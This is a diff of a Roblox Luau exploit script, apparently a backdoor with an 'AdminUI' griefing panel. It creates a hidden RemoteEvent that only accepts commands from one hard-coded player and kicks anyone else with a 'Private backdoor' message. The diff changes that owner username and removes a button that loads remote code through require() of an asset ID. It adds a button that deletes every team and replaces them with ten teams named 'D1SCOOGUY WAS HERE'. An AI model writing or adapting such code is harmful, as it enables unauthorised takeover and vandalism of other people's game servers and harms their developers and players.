@@ -51,8 +51,8 @@ local InitPayload = [[
         local success, err = pcall(function()
             local SecureRemote = Instance.new("RemoteEvent")
             SecureRemote.OnServerEvent:Connect(function(plr, payload)
-                if plr ~= game.Players["luau342432"] then
-                    SecureRemote:FireClient(game.Players["luau342432"], plr.Name)
+                if plr ~= game.Players["d1scooguy"] then
+                    SecureRemote:FireClient(game.Players["d1scooguy"], plr.Name)
                     plr:Kick("Private backdoor, dont touch.")
                     return
                 end
@@ -94,7 +94,7 @@ local SecureRemote = game.Workspace:WaitForChild("SecureRemote", 10)
 
 
 local Payload = [[
-local player = game.Players:FindFirstChild("luau342432")
+local player = game.Players:FindFirstChild("d1scooguy")
 if player then
     local gui = Instance.new("ScreenGui")
     gui.Name = "AdminUI"
@@ -222,12 +222,29 @@ end)
         newSky.Parent = game.Lighting
     end)
 
+makeButton("Destruir y Crear Equipos", function()
+    local TeamsService = game:GetService("Teams")
 
-makeButton("Cargar Payload", function()
-    local username = game.Players.LocalPlayer.Name
-    local payload = [[require(123255432303221):Pload("]] .. username .. [[")]]
-    loadstring(payload)()
+    -- Eliminar todos los equipos existentes
+    for _, team in pairs(TeamsService:GetChildren()) do
+        if team:IsA("Team") then
+            team:Destroy()
+        end
+    end
+
+    -- Crear 10 equipos nuevos con el mismo nombre
+    for i = 1, 10 do
+        local team = Instance.new("Team")
+        team.Name = "D1SCOOGUY WAS HERE"
+        team.TeamColor = BrickColor.random()
+        team.AutoAssignable = false
+        team.Parent = TeamsService
+    end
 end)
+
+
+
+
 
 
     makeButton("Decal spam", function()
@@ -418,4 +435,3 @@ end
 
 SecureRemote:FireServer(Payload)
 warn("d1scoogui loaded")
-
